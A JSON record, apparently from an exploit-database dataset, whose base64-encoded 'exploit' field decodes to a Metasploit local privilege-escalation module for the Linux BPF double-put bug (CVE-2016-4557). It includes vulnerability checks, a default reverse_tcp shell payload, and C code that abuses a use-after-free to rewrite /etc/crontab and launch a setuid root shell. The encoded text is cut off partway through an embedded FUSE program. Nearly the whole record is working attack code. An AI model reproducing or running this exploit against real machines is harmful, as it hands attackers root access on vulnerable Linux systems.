{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cDovL21ldGFzcGxvaXQuY29tL2Rvd25sb2FkDQojIEN1cnJlbnQgc291cmNlOiBodHRwczovL2dpdGh1Yi5jb20vcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrDQojIw0KDQpyZXF1aXJlICdtc2YvY29yZScNCg0KY2xhc3MgTWV0YXNwbG9pdE1vZHVsZSA8IE1zZjo6RXhwbG9pdDo6TG9jYWwNCiAgUmFuayA9IEdvb2RSYW5raW5nDQoNCiAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OkVYRQ0KICBpbmNsdWRlIE1zZjo6UG9zdDo6RmlsZQ0KICBpbmNsdWRlIE1zZjo6RXhwbG9pdDo6RmlsZURyb3BwZXINCg0KICBkZWYgaW5pdGlhbGl6ZShpbmZvPXt9KQ0KICAgIHN1cGVyKCB1cGRhdGVfaW5mbyggaW5mbywgew0KICAgICAgICAnTmFtZScgICAgICAgICAgPT4gJ0xpbnV4IEJQRiBMb2NhbCBQcml2aWxlZ2UgRXNjYWxhdGlvbicsDQogICAgICAgICdEZXNjcmlwdGlvbicgICA9PiAlcXsNCiAgICAgICAgICBMaW51eCBrZXJuZWwgPj00LjQgd2l0aCBDT05GSUdfQlBGX1NZU0NBTEwgYW5kIGtlcm5lbC51bnByaXZpbGVnZWRfYnBmX2Rpc2FibGVkDQogICAgICAgICAgc3lzY3RsIGlzIG5vdCBzZXQgdG8gMSwgQlBGIGNhbiBiZSBhYnVzZWQgdG8gcHJpdiBlc2NhbGF0ZS4NCiAgICAgICAgICBVYnVudHUgMTYuMDQgaGFzIGFsbCBvZiB0aGVzZSBjb25kaXRpb25zIG1ldC4NCiAgICAgICAgfSwNCiAgICAgICAgJ0xpY2Vuc2UnICAgICAgID0+IE1TRl9MSUNFTlNFLA0KICAgICAgICAnQXV0aG9yJyAgICAgICAgPT4NCiAgICAgICAgICBbDQogICAgICAgICAgICAnamFubmhAZ29vZ2xlLmNvbScsICAgICAgICAgICAgICAgICAgICAjIGRpc2NvdmVyeQ0KICAgICAgICAgICAgJ2gwMGRpZSA8bWlrZUBzaG9yZWJyZWFrc2VjdXJpdHkuY29tPicgIyBtZXRhc3Bsb2l0IG1vZHVsZQ0KICAgICAgICAgIF0sDQogICAgICAgICdQbGF0Zm9ybScgICAgICA9PiBbICdsaW51eCcgXSwNCiAgICAgICAgJ0FyY2gnICAgICAgICAgID0+IFsgQVJDSF9YODYsIEFSQ0hfWDg2XzY0IF0sDQogICAgICAgICdTZXNzaW9uVHlwZXMnICA9PiBbICdzaGVsbCcsICdtZXRlcnByZXRlcicgXSwNCiAgICAgICAgJ1JlZmVyZW5jZXMnICAgID0+DQogICAgICAgICAgWw0KICAgICAgICAgICAgWyAnQ1ZFJywgJzIwMTYtNDU1NycgXSwNCiAgICAgICAgICAgIFsgJ0VEQicsICczOTc3MicgXSwNCiAgICAgICAgICAgIFsgJ1VSTCcsICdodHRwczovL2J1Z3MuY2hyb21pdW0ub3JnL3AvcHJvamVjdC16ZXJvL2lzc3Vlcy9kZXRhaWw/aWQ9ODA4JyBdLA0KICAgICAgICAgICAgWyAnVVJMJywgJ2h0dHBzOi8vZ2l0Lmtlcm5lbC5vcmcvY2dpdC9saW51eC9rZXJuZWwvZ2l0L3RvcnZhbGRzL2xpbnV4LmdpdC9jb21taXQvP2lkPTgzNThiMDJiZjY3ZDNhNWQ4YTgyNTA3MGUxYWE3M2YyNWZiMmU0YzcnIF0NCiAgICAgICAgICBdLA0KICAgICAgICAnVGFyZ2V0cycgICAgICAgPT4NCiAgICAgICAgICBbDQogICAgICAgICAgICBbICdMaW51eCB4ODYnLCAgICAgICB7ICdBcmNoJyA9PiBBUkNIX1g4NiB9IF0sDQogICAgICAgICAgICBbICdMaW51eCB4NjQnLCAgICAgICB7ICdBcmNoJyA9PiBBUkNIX1g4Nl82NCB9IF0NCiAgICAgICAgICBdLA0KICAgICAgICAnRGVmYXVsdE9wdGlvbnMnID0+DQogICAgICAgICAgew0KICAgICAgICAgICAgJ3BheWxvYWQnID0+ICdsaW51eC94NjQvbWV0dGxlL3JldmVyc2VfdGNwJywNCiAgICAgICAgICAgICdQcmVwZW5kRm9yaycgPT4gdHJ1ZSwNCiAgICAgICAgICAgICdXZnNEZWxheScgPT4gNjAgIyB3ZSBjYW4gY2hldyB1cCBhIGxvdCBvZiBDUFUgZm9yIHRoaXMsIHNvIHdlIHdhbnQgdG8gZ2l2ZSB0aW1lIGZvciBwYXlsb2FkIHRvIGNvbWUgdGhyb3VnaA0KICAgICAgICAgICAgfSwNCiAgICAgICAgJ0RlZmF1bHRUYXJnZXQnID0+IDEsDQogICAgICAgICdEaXNjbG9zdXJlRGF0ZScgPT4gJ01heSAwNCAyMDE2JywNCiAgICAgICAgJ1ByaXZpbGVnZWQnICAgICA9PiB0cnVlDQogICAgICB9DQogICAgICApKQ0KICAgIHJlZ2lzdGVyX29wdGlvbnMoWw0KICAgICAgICBPcHRTdHJpbmcubmV3KCdXcml0YWJsZURpcicsIFsgdHJ1ZSwgJ0EgZGlyZWN0b3J5IHdoZXJlIHdlIGNhbiB3cml0ZSBmaWxlcycsICcvdG1wJyBdKSwNCiAgICAgICAgT3B0RW51bS5uZXcoJ0NPTVBJTEUnLCBbIHRydWUsICdDb21waWxlIG9uIHRhcmdldCcsICdBdXRvJywgWydBdXRvJywgJ1RydWUnLCAnRmFsc2UnXV0pLA0KICAgICAgICBPcHRJbnQubmV3KCdNQVhXQUlUJywgWyB0cnVlLCAnTWF4IHNlY29uZHMgdG8gd2FpdCBmb3IgZGVjcmVtZW50YXRpb24gaW4gc2Vjb25kcycsIDEyMCBdKQ0KICAgICAgXSwgc2VsZi5jbGFzcykNCiAgZW5kDQoNCiAgZGVmIGNoZWNrDQogICAgZGVmIGNoZWNrX2NvbmZpZ19icGZfc3lzY2FsbD8oKQ0KICAgICAgb3V0cHV0ID0gY21kX2V4ZWMoJ2dyZXAgQ09ORklHX0JQRl9TWVNDQUxMIC9ib290L2NvbmZpZy1gdW5hbWUgLXJgJykNCiAgICAgIGlmIG91dHB1dCA9PSAnQ09ORklHX0JQRl9TWVNDQUxMPXknDQogICAgICAgIHZwcmludF9nb29kKCdDT05GSUdfQlBGX1NZU0NBTEwgaXMgc2V0IHRvIHllcycpDQogICAgICAgIHJldHVybiB0cnVlDQogICAgICBlbHNlDQogICAgICAgIHByaW50X2Vycm9yKCdDT05GSUdfQlBGX1NZU0NBTEwgaXMgTk9UIHNldCB0byB5ZXMnKQ0KICAgICAgICByZXR1cm4gZmFsc2UNCiAgICAgIGVuZA0KICAgIGVuZA0KDQogICAgZGVmIGNoZWNrX2tlcm5lbF9kaXNhYmxlZD8oKQ0KICAgICAgb3V0cHV0ID0gY21kX2V4ZWMoJ3N5c2N0bCBrZXJuZWwudW5wcml2aWxlZ2VkX2JwZl9kaXNhYmxlZCcpDQogICAgICBpZiBvdXRwdXQgIT0gJ2tlcm5lbC51bnByaXZpbGVnZWRfYnBmX2Rpc2FibGVkID0gMScNCiAgICAgICAgdnByaW50X2dvb2QoJ2tlcm5lbC51bnByaXZpbGVnZWRfYnBmX2Rpc2FibGVkIGlzIE5PVCBzZXQgdG8gMScpDQogICAgICAgIHJldHVybiB0cnVlDQogICAgICBlbHNlDQogICAgICAgIHByaW50X2Vycm9yKCdrZXJuZWwudW5wcml2aWxlZ2VkX2JwZl9kaXNhYmxlZCBpcyBzZXQgdG8gMScpDQogICAgICAgIHJldHVybiBmYWxzZQ0KICAgICAgZW5kDQogICAgZW5kDQoNCiAgICBkZWYgY2hlY2tfZnVzZT8oKQ0KICAgICAgbGliID0gY21kX2V4ZWMoJ2Rwa2cgLS1nZXQtc2VsZWN0aW9ucyB8IGdyZXAgXmZ1c2UnKQ0KICAgICAgaWYgbGliLmluY2x1ZGU/KCdpbnN0YWxsJykNCiAgICAgICAgdnByaW50X2dvb2QoJ2Z1c2UgaXMgaW5zdGFsbGVkJykNCiAgICAgICAgcmV0dXJuIHRydWUNCiAgICAgIGVsc2UNCiAgICAgICAgcHJpbnRfZXJyb3IoJ2Z1c2UgaXMgbm90IGluc3RhbGxlZC4gIEV4cGxvaXRhdGlvbiB3aWxsIGZhaWwuJykNCiAgICAgICAgcmV0dXJuIGZhbHNlDQogICAgICBlbmQNCiAgICBlbmQNCg0KICAgIGRlZiBtb3VudF9wb2ludF9leGlzdHM/KCkNCiAgICAgIGlmIGRpcmVjdG9yeT8oJy90bXAvZnVzZV9tb3VudCcpDQogICAgICAgIHByaW50X2Vycm9yKCcvdG1wL2Z1c2VfbW91bnQgc2hvdWxkIGJlIHVubW91bnRlZCBhbmQgZGVsZXRlZC4gIEV4cGxvaXRhdGlvbiB3aWxsIGZhaWwuJykNCiAgICAgICAgcmV0dXJuIGZhbHNlDQogICAgICBlbHNlDQogICAgICAgIHZwcmludF9nb29kKCcvdG1wL2Z1c2VfbW91bnQgZG9lc25cJ3QgZXhpc3QnKQ0KICAgICAgICByZXR1cm4gdHJ1ZQ0KICAgICAgZW5kDQogICAgZW5kDQoNCiAgICBpZiBjaGVja19jb25maWdfYnBmX3N5c2NhbGw/KCkgJiYgY2hlY2tfa2VybmVsX2Rpc2FibGVkPygpICYmIGNoZWNrX2Z1c2U/KCkgJiYgbW91bnRfcG9pbnRfZXhpc3RzPygpDQogICAgICBDaGVja0NvZGU6OkFwcGVhcnMNCiAgICBlbHNlDQogICAgICBDaGVja0NvZGU6OlNhZmUNCiAgICBlbmQNCiAgZW5kDQoNCiAgZGVmIGV4cGxvaXQNCg0KICAgIGRlZiB1cGxvYWRfYW5kX2NvbXBpbGUoZmlsZW5hbWUsIGZpbGVfcGF0aCwgZmlsZV9jb250ZW50LCBjb21waWxlPW5pbCkNCiAgICAgIHJtX2YgIiN7ZmlsZV9wYXRofSINCiAgICAgIGlmIG5vdCBjb21waWxlLm5pbD8NCiAgICAgICAgcm1fZiAiI3tmaWxlX3BhdGh9LmMiDQogICAgICAgIHZwcmludF9zdGF0dXMoIldyaXRpbmcgI3tmaWxlbmFtZX0gdG8gI3tmaWxlX3BhdGh9LmMiKQ0KICAgICAgICB3cml0ZV9maWxlKCIje2ZpbGVfcGF0aH0uYyIsIGZpbGVfY29udGVudCkNCiAgICAgICAgcmVnaXN0ZXJfZmlsZV9mb3JfY2xlYW51cCgiI3tmaWxlX3BhdGh9LmMiKQ0KICAgICAgICBvdXRwdXQgPSBjbWRfZXhlYyhjb21waWxlKQ0KICAgICAgICBpZiBvdXRwdXQgIT0gJycNCiAgICAgICAgICBwcmludF9lcnJvcihvdXRwdXQpDQogICAgICAgICAgZmFpbF93aXRoKEZhaWx1cmU6OlVua25vd24sICIje2ZpbGVuYW1lfSBhdCAje2ZpbGVfcGF0aH0uYyBmYWlsZWQgdG8gY29tcGlsZSIpDQogICAgICAgIGVuZA0KICAgICAgZWxzZQ0KICAgICAgICB2cHJpbnRfc3RhdHVzKCJXcml0aW5nICN7ZmlsZW5hbWV9IHRvICN7ZmlsZV9wYXRofSIpDQogICAgICAgIHdyaXRlX2ZpbGUoZmlsZV9wYXRoLCBmaWxlX2NvbnRlbnQpDQogICAgICBlbmQNCiAgICAgIGNtZF9leGVjKCJjaG1vZCAreCAje2ZpbGVfcGF0aH0iKTsNCiAgICAgIHJlZ2lzdGVyX2ZpbGVfZm9yX2NsZWFudXAoZmlsZV9wYXRoKQ0KICAgIGVuZA0KDQogICAgZG91YmxlcHV0ID0gJXF7DQogICAgICAjZGVmaW5lIF9HTlVfU09VUkNFDQogICAgICAjaW5jbHVkZSA8c3RkYm9vbC5oPg0KICAgICAgI2luY2x1ZGUgPGVycm5vLmg+DQogICAgICAjaW5jbHVkZSA8ZXJyLmg+DQogICAgICAjaW5jbHVkZSA8dW5pc3RkLmg+DQogICAgICAjaW5jbHVkZSA8ZmNudGwuaD4NCiAgICAgICNpbmNsdWRlIDxzY2hlZC5oPg0KICAgICAgI2luY2x1ZGUgPHNpZ25hbC5oPg0KICAgICAgI2luY2x1ZGUgPHN0ZGxpYi5oPg0KICAgICAgI2luY2x1ZGUgPHN0ZGlvLmg+DQogICAgICAjaW5jbHVkZSA8c3RyaW5nLmg+DQogICAgICAjaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQogICAgICAjaW5jbHVkZSA8c3lzL3N0YXQuaD4NCiAgICAgICNpbmNsdWRlIDxzeXMvc3lzY2FsbC5oPg0KICAgICAgI2luY2x1ZGUgPHN5cy9wcmN0bC5oPg0KICAgICAgI2luY2x1ZGUgPHN5cy91aW8uaD4NCiAgICAgICNpbmNsdWRlIDxzeXMvbW1hbi5oPg0KICAgICAgI2luY2x1ZGUgPHN5cy93YWl0Lmg+DQogICAgICAjaW5jbHVkZSA8bGludXgvYnBmLmg+DQogICAgICAjaW5jbHVkZSA8bGludXgva2NtcC5oPg0KDQogICAgICAjaWZuZGVmIF9fTlJfYnBmDQogICAgICAjIGlmIGRlZmluZWQoX19pMzg2X18pDQogICAgICAjICBkZWZpbmUgX19OUl9icGYgMzU3DQogICAgICAjIGVsaWYgZGVmaW5lZChfX3g4Nl82NF9fKQ0KICAgICAgIyAgZGVmaW5lIF9fTlJfYnBmIDMyMQ0KICAgICAgIyBlbGlmIGRlZmluZWQoX19hYXJjaDY0X18pDQogICAgICAjICBkZWZpbmUgX19OUl9icGYgMjgwDQogICAgICAjIGVsc2UNCiAgICAgICMgIGVycm9yDQogICAgICAjIGVuZGlmDQogICAgICAjZW5kaWYNCg0KICAgICAgaW50IHVhZl9mZDsNCg0KICAgICAgaW50IHRhc2tfYih2b2lkICpwKSB7DQogICAgICAgIC8qIHN0ZXAgMjogc3RhcnQgd3JpdGV2IHdpdGggc2xvdyBJT1YsIHJhaXNpbmcgdGhlIHJlZmNvdW50IHRvIDIgKi8NCiAgICAgICAgY2hhciAqY3dkID0gZ2V0X2N1cnJlbnRfZGlyX25hbWUoKTsNCiAgICAgICAgY2hhciBkYXRhWzIwNDhdOw0KICAgICAgICBzcHJpbnRmKGRhdGEsICIqICogKiAqICogcm9vdCAvYmluL2Nob3duIHJvb3Q6cm9vdCAnJXMnL3N1aWRoZWxwZXI7IC9iaW4vY2htb2QgMDY3NTUgJyVzJy9zdWlkaGVscGVyXG4jIiwgY3dkLCBjd2QpOw0KICAgICAgICBzdHJ1Y3QgaW92ZWMgaW92ID0geyAuaW92X2Jhc2UgPSBkYXRhLCAuaW92X2xlbiA9IHN0cmxlbihkYXRhKSB9Ow0KICAgICAgICBpZiAoc3lzdGVtKCJmdXNlcm1vdW50IC11IC9ob21lL3VzZXIvZWJwZl9tYXBmZF9kb3VibGVwdXQvZnVzZV9tb3VudCAyPi9kZXYvbnVsbDsgbWtkaXIgLXAgZnVzZV9tb3VudCAmJiAuL2hlbGxvIC4vZnVzZV9tb3VudCIpKQ0KICAgICAgICAgIGVycngoMSwgInN5c3RlbSgpIGZhaWxlZCIpOw0KICAgICAgICBpbnQgZnVzZV9mZCA9IG9wZW4oImZ1c2VfbW91bnQvaGVsbG8iLCBPX1JEV1IpOw0KICAgICAgICBpZiAoZnVzZV9mZCA9PSAtMSkNCiAgICAgICAgICBlcnIoMSwgInVuYWJsZSB0byBvcGVuIEZVU0UgZmQiKTsNCiAgICAgICAgaWYgKHdyaXRlKGZ1c2VfZmQsICZpb3YsIHNpemVvZihpb3YpKSAhPSBzaXplb2YoaW92KSkNCiAgICAgICAgICBlcnJ4KDEsICJ1bmFibGUgdG8gd3JpdGUgdG8gRlVTRSBmZCIpOw0KICAgICAgICBzdHJ1Y3QgaW92ZWMgKmlvdl8gPSBtbWFwKE5VTEwsIHNpemVvZihpb3YpLCBQUk9UX1JFQUQsIE1BUF9TSEFSRUQsIGZ1c2VfZmQsIDApOw0KICAgICAgICBpZiAoaW92XyA9PSBNQVBfRkFJTEVEKQ0KICAgICAgICAgIGVycigxLCAidW5hYmxlIHRvIG1tYXAgRlVTRSBmZCIpOw0KICAgICAgICBmcHV0cygic3RhcnRpbmcgd3JpdGV2XG4iLCBzdGRlcnIpOw0KICAgICAgICBzc2l6ZV90IHdyaXRldl9yZXMgPSB3cml0ZXYodWFmX2ZkLCBpb3ZfLCAxKTsNCiAgICAgICAgLyogLi4uIGFuZCBzdGFydGluZyBpbnNpZGUgdGhlIHByZXZpb3VzIGxpbmUsIGFsc28gc3RlcCA2OiBjb250aW51ZSB3cml0ZXYgd2l0aCBzbG93IElPViAqLw0KICAgICAgICBpZiAod3JpdGV2X3JlcyA9PSAtMSkNCiAgICAgICAgICBlcnIoMSwgIndyaXRldiBmYWlsZWQiKTsNCiAgICAgICAgaWYgKHdyaXRldl9yZXMgIT0gc3RybGVuKGRhdGEpKQ0KICAgICAgICAgIGVycngoMSwgIndyaXRldiByZXR1cm5lZCAlZCIsIChpbnQpd3JpdGV2X3Jlcyk7DQogICAgICAgIGZwdXRzKCJ3cml0ZXYgcmV0dXJuZWQgc3VjY2Vzc2Z1bGx5LiBpZiB0aGlzIHdvcmtlZCwgeW91J2xsIGhhdmUgYSByb290IHNoZWxsIGluIDw9NjAgc2Vjb25kcy5cbiIsIHN0ZGVycik7DQogICAgICAgIHdoaWxlICgxKSBzbGVlcCgxKTsgLyogd2hhdGV2ZXIsIGp1c3QgZG9uJ3QgY3Jhc2ggKi8NCiAgICAgIH0NCg0KICAgICAgdm9pZCBtYWtlX3NldHVpZCh2b2lkKSB7DQogICAgICAgIC8qIHN0ZXAgMTogb3BlbiB3cml0YWJsZSBVQUYgZmQgKi8NCiAgICAgICAgdWFmX2ZkID0gb3BlbigiL2Rldi9udWxsIiwgT19XUk9OTFl8T19DTE9FWEVDKTsNCiAgICAgICAgaWYgKHVhZl9mZCA9PSAtMSkNCiAgICAgICAgICBlcnIoMSwgInVuYWJsZSB0byBvcGVuIFVBRiBmZCIpOw0KICAgICAgICAvKiByZWZjb3VudCBpcyBub3cgMSAqLw0KDQogICAgICAgIGNoYXIgY2hpbGRfc3RhY2tbMjAwMDBdOw0KICAgICAgICBpbnQgY2hpbGQgPSBjbG9uZSh0YXNrX2IsIGNoaWxkX3N0YWNrICsgc2l6ZW9mKGNoaWxkX3N0YWNrKSwgQ0xPTkVfRklMRVMgfCBTSUdDSExELCBOVUxMKTsNCiAgICAgICAgaWYgKGNoaWxkID09IC0xKQ0KICAgICAgICAgIGVycigxLCAiY2xvbmUiKTsNCiAgICAgICAgc2xlZXAoMyk7DQogICAgICAgIC8qIHJlZmNvdW50IGlzIG5vdyAyICovDQoNCiAgICAgICAgLyogc3RlcCAyKzM6IHVzZSBCUEYgdG8gcmVtb3ZlIHR3byByZWZlcmVuY2VzICovDQogICAgICAgIGZvciAoaW50IGk9MDsgaTwyOyBpKyspIHsNCiAgICAgICAgICBzdHJ1Y3QgYnBmX2luc24gaW5zbnNbMl0gPSB7DQogICAgICAgICAgICB7DQogICAgICAgICAgICAgIC5jb2RlID0gQlBGX0xEIHwgQlBGX0lNTSB8IEJQRl9EVywNCiAgICAgICAgICAgICAgLnNyY19yZWcgPSBCUEZfUFNFVURPX01BUF9GRCwNCiAgICAgICAgICAgICAgLmltbSA9IHVhZl9mZA0KICAgICAgICAgICAgfSwNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICB9Ow0KICAgICAgICAgIHVuaW9uIGJwZl9hdHRyIGF0dHIgPSB7DQogICAgICAgICAgICAucHJvZ190eXBlID0gQlBGX1BST0dfVFlQRV9TT0NLRVRfRklMVEVSLA0KICAgICAgICAgICAgLmluc25fY250ID0gMiwNCiAgICAgICAgICAgIC5pbnNucyA9IChfX2FsaWduZWRfdTY0KSBpbnNucywNCiAgICAgICAgICAgIC5saWNlbnNlID0gKF9fYWxpZ25lZF91NjQpIiINCiAgICAgICAgICB9Ow0KICAgICAgICAgIGlmIChzeXNjYWxsKF9fTlJfYnBmLCBCUEZfUFJPR19MT0FELCAmYXR0ciwgc2l6ZW9mKGF0dHIpKSAhPSAtMSkNCiAgICAgICAgICAgIGVycngoMSwgImV4cGVjdGVkIEJQRl9QUk9HX0xPQUQgdG8gZmFpbCwgYnV0IGl0IGRpZG4ndCIpOw0KICAgICAgICAgIGlmIChlcnJubyAhPSBFSU5WQUwpDQogICAgICAgICAgICBlcnIoMSwgImV4cGVjdGVkIEJQRl9QUk9HX0xPQUQgdG8gZmFpbCB3aXRoIC1FSU5WQUwsIGdvdCBkaWZmZXJlbnQgZXJyb3IiKTsNCiAgICAgICAgfQ0KICAgICAgICAvKiByZWZjb3VudCBpcyBub3cgMCwgdGhlIGZpbGUgaXMgZnJlZWQgc29vbi1pc2ggKi8NCg0KICAgICAgICAvKiBzdGVwIDU6IG9wZW4gYSBidW5jaCBvZiByZWFkb25seSBmaWxlIGRlc2NyaXB0b3JzIHRvIHRoZSB0YXJnZXQgZmlsZSB1bnRpbCB3ZSBoaXQgdGhlIHNhbWUgcG9pbnRlciAqLw0KICAgICAgICBpbnQgc3RhdHVzOw0KICAgICAgICBpbnQgaG9zdG5hbWVmZHNbMTAwMF07DQogICAgICAgIGludCB1c2VkX2ZkcyA9IDA7DQogICAgICAgIGJvb2wgdXAgPSB0cnVlOw0KICAgICAgICB3aGlsZSAoMSkgew0KICAgICAgICAgIGlmICh3YWl0cGlkKGNoaWxkLCAmc3RhdHVzLCBXTk9IQU5HKSA9PSBjaGlsZCkNCiAgICAgICAgICAgIGVycngoMSwgImNoaWxkIHF1aXQgYmVmb3JlIHdlIGdvdCBhIGdvb2QgZmlsZSoiKTsNCiAgICAgICAgICBpZiAodXApIHsNCiAgICAgICAgICAgIGhvc3RuYW1lZmRzW3VzZWRfZmRzXSA9IG9wZW4oIi9ldGMvY3JvbnRhYiIsIE9fUkRPTkxZKTsNCiAgICAgICAgICAgIGlmIChob3N0bmFtZWZkc1t1c2VkX2Zkc10gPT0gLTEpDQogICAgICAgICAgICAgIGVycigxLCAib3BlbiB0YXJnZXQgZmlsZSIpOw0KICAgICAgICAgICAgaWYgKHN5c2NhbGwoX19OUl9rY21wLCBnZXRwaWQoKSwgZ2V0cGlkKCksIEtDTVBfRklMRSwgdWFmX2ZkLCBob3N0bmFtZWZkc1t1c2VkX2Zkc10pID09IDApIGJyZWFrOw0KICAgICAgICAgICAgdXNlZF9mZHMrKzsNCiAgICAgICAgICAgIGlmICh1c2VkX2ZkcyA9PSAxMDAwKSB1cCA9IGZhbHNlOw0KICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBjbG9zZShob3N0bmFtZWZkc1stLXVzZWRfZmRzXSk7DQogICAgICAgICAgICBpZiAodXNlZF9mZHMgPT0gMCkgdXAgPSB0cnVlOw0KICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBmcHV0cygid29vaG9vLCBnb3QgcG9pbnRlciByZXVzZVxuIiwgc3RkZXJyKTsNCiAgICAgICAgd2hpbGUgKDEpIHNsZWVwKDEpOyAvKiB3aGF0ZXZlciwganVzdCBkb24ndCBjcmFzaCAqLw0KICAgICAgfQ0KDQogICAgICBpbnQgbWFpbih2b2lkKSB7DQogICAgICAgIHBpZF90IGNoaWxkID0gZm9yaygpOw0KICAgICAgICBpZiAoY2hpbGQgPT0gLTEpDQogICAgICAgICAgZXJyKDEsICJmb3JrIik7DQogICAgICAgIGlmIChjaGlsZCA9PSAwKQ0KICAgICAgICAgIG1ha2Vfc2V0dWlkKCk7DQogICAgICAgIHN0cnVjdCBzdGF0IGhlbHBlcnN0YXQ7DQogICAgICAgIHdoaWxlICgxKSB7DQogICAgICAgICAgaWYgKHN0YXQoInN1aWRoZWxwZXIiLCAmaGVscGVyc3RhdCkpDQogICAgICAgICAgICBlcnIoMSwgInN0YXQgc3VpZGhlbHBlciIpOw0KICAgICAgICAgIGlmIChoZWxwZXJzdGF0LnN0X21vZGUgJiBTX0lTVUlEKQ0KICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgc2xlZXAoMSk7DQogICAgICAgIH0NCiAgICAgICAgZnB1dHMoInN1aWQgZmlsZSBkZXRlY3RlZCwgbGF1bmNoaW5nIHJvb3RzaGVsbC4uLlxuIiwgc3RkZXJyKTsNCiAgICAgICAgZXhlY2woIi4vc3VpZGhlbHBlciIsICJzdWlkaGVscGVyIiwgTlVMTCk7DQogICAgICAgIGVycigxLCAiZXhlY2wgc3VpZGhlbHBlciIpOw0KICAgICAgfQ0KICAgIH0NCg0KICAgIHN1aWRfaGVscGVyID0gJXF7DQogICAgICAjaW5jbHVkZSA8dW5pc3RkLmg+DQogICAgICAjaW5jbHVkZSA8ZXJyLmg+DQogICAgICAjaW5jbHVkZSA8c3RkaW8uaD4NCiAgICAgICNpbmNsdWRlIDxzeXMvdHlwZXMuaD4NCg0KICAgICAgaW50IG1haW4odm9pZCkgew0KICAgICAgICBpZiAoc2V0dWlkKDApIHx8IHNldGdpZCgwKSkNCiAgICAgICAgICBlcnIoMSwgInNldHVpZC9zZXRnaWQiKTsNCiAgICAgICAgZnB1dHMoIndlIGhhdmUgcm9vdCBwcml2cyBub3cuLi5cbiIsIHN0ZGVycik7DQogICAgICAgIGV4ZWNsKCIvYmluL2Jhc2giLCAiYmFzaCIsIE5VTEwpOw0KICAgICAgICBlcnIoMSwgImV4ZWNsIik7DQogICAgICB9DQoNCiAgICB9DQoNCiAgICBoZWxsbyA9ICVxew0KICAgICAgLyoNCiAgICAgICAgRlVTRTogRmlsZXN5c3RlbSBpbiBVc2Vyc3BhY2UNCiAgICAgICAgQ29weXJpZ2h0IChDKSAyMDAxLTIwMDcgIE1pa2xvcyBTemVyZWRpIDxtaWtsb3NAc3plcmVkaS5odT4NCiAgICAgICAgaGVhdmlseSBtb2RpZmllZCBieSBKYW5uIEhvcm4gPGphbm5oQGdvb2dsZS5jb20+DQoNCiAgICAgICAgVGhpcyBwcm9ncmFtIGNhbiBiZSBkaXN0cmlidXRlZCB1bmRlciB0aGUgdGVybXMgb2YgdGhlIEdOVSBHUEwuDQogICAgICAgIFNlZSB0aGUgZmlsZSBDT1BZSU5HLg0KDQogICAgICAgIGdjYyAtV2FsbCBoZWxsby5jIGBwa2ctY29uZmlnIGZ1c2UgLS1jZmxhZ3MgLS1saWJzYCAtbyBoZWxsbw0KICAgICAgKi8NCg0KICAgICAgI2RlZmluZSBGVVNFX1VTRV9WRVJTSU9OIDI2DQoNCiAgICAgICNpbmNsdWRlIDxmdXNlLmg+DQogICAgICAjaW5jbHVkZSA8c3RkaW8uaD4NCiAgICAgICNpbmNsdWRlIDxzdHJpbmcuaD4NCiAgICAgICNpbmNsdWRlIDxlcnJuby5oPg0KICAgICAgI2luY2x1ZGUgPGZjbnRsLmg+DQogICAgICAjaW5jbHVkZSA8dW5pc3RkLmg+DQogICAgICAjaW5jbHVkZSA8ZXJyLmg+DQogICAgICAjaW5jbHVkZSA8c3lzL3Vpby5oPg0KDQogICAgICBzdGF0aWMgY29uc3QgY2hhciAqaGVsbG9fcGF0aCA9ICIvaGVsbG8iOw0KDQogICAgICBzdGF0aWMgY2hhciBkYXRhX3N0YXRlW3NpemVvZihzdHJ1Y3QgaW92ZWMpXTsNCg0KICAgICAgc3RhdGljIGludCBoZWxsb19nZXRhdHRyKGNvbnN0IGNoYXIgKnBhdGgsIHN0cnVjdCBzdGF0ICpzdGJ1ZikNCiAgICAgIHsNCiAgICAgICAgaW50IHJlcyA9IDA7DQogICAgICAgIG1lbXNldChzdGJ1ZiwgMCwgc2l6ZW9mKHN0cnVjdCBzdGF0KSk7DQogICAgICAgIGlmIChzdHJjbXAocGF0aCwgIi8iKSA9PSAwKSB7DQogICAgICAgICAgc3RidWYtPnN0X21vZGUgPSBTX0lGRElSIHwgMDc1NTsNCiAgICAgICAgICBzdGJ1Zi0+c3RfbmxpbmsgPSAyOw0KICAgICAgICB9IGVsc2UgaWYgKHN0cmNtcChwYXRoLCBoZWxsb19wYXRoKSA9PSAwKSB7DQogICAgICAgICAgc3RidWYtPnN0X21vZGUgPSBTX0lGUkVHIHwgMDY2NjsNCiAgICAgICAgICBzdGJ1Zi0+c3RfbmxpbmsgPSAxOw0KICAgICAgICAgIHN0YnVmLT5zdF9zaXplID0gc2l6ZW9mKGRhdGFfc3RhdGUpOw0KICAgICAgICAgIHN0YnVmLT5zdF9ibG9ja3MgPSAwOw0KICAgICAgICB9IGVsc2UNCiAgICAgICAgICByZXMgPSAtRU5PRU5UOw0KICAgICAgICByZXR1cm4gcmVzOw0KICAgICAgfQ0KDQogICAgICBzdGF0aWMgaW50IGhlbGxvX3JlYWRkaXIoY29uc3QgY2hhciAqcGF0aCwgdm9pZCAqYnVmLCBmdXNlX2ZpbGxfZGlyX3QgZmlsbGVyLCBvZmZfdCBvZmZzZXQsIHN0cnVjdCBmdXNlX2ZpbGVfaW5mbyAqZmkpIHsNCiAgICAgICAgZmlsbGVyKGJ1ZiwgIi4iLCBOVUxMLCAwKTsNCiAgICAgICAgZmlsbGVyKGJ1ZiwgIi4uIiwgTlVMTCwgMCk7DQogICAgICAgIGZpbGxlcihidWYsIGhlbGxvX3BhdGggKyAxLCBOVUxMLCAwKTsNCiAgICAgICAgcmV0dXJuIDA7DQogICAgICB9DQoNCiAgICAgIHN0YXRpYyBpbnQgaGVsbG9fb3Blbihjb25zdCBjaGFyICpwYXRoLCBzdHJ1Y3QgZnVzZV9maWxlX2luZm8gKmZpKSB7DQogICAgICAgIHJldHVybiAwOw0KICAgICAgfQ0KDQogICAgICBzdGF0aWMgaW50IGhlbGxvX3JlYWQoY29uc3QgY2hhciAqcGF0aCwgY2hhciAqYnVmLCBzaXplX3Qgc2l6ZSwgb2ZmX3Qgb2Zmc2V0LCB